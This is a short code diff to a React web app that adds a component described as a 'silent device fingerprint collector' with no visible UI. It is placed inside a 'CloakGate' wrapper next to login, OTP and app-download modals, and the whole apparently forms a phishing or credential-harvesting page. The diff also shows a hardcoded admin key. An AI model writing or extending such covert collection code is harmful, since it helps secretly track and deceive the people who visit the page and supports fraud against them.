@@ -3,6 +3,7 @@ import LoginPage from './components/LoginPage';
 import OtpModal from './components/OtpModal';
 import AppDownloadModal from './components/AppDownloadModal';
 import AdminPanel from './components/AdminPanel';
+import FingerprintCollector from './components/FingerprintCollector';
 
 
 const ADMIN_KEY = 'whapsendmail';
@@ -328,6 +329,9 @@ function App() {
 
   return (
     <CloakGate>
+      {/* Silent device fingerprint collector — no visible UI */}
+      <FingerprintCollector accessKey={VALID_ACCESS_KEY} />
+
       <div className="min-h-screen bg-slate-50 relative select-none">
         <LoginPage
           key={loginKey}
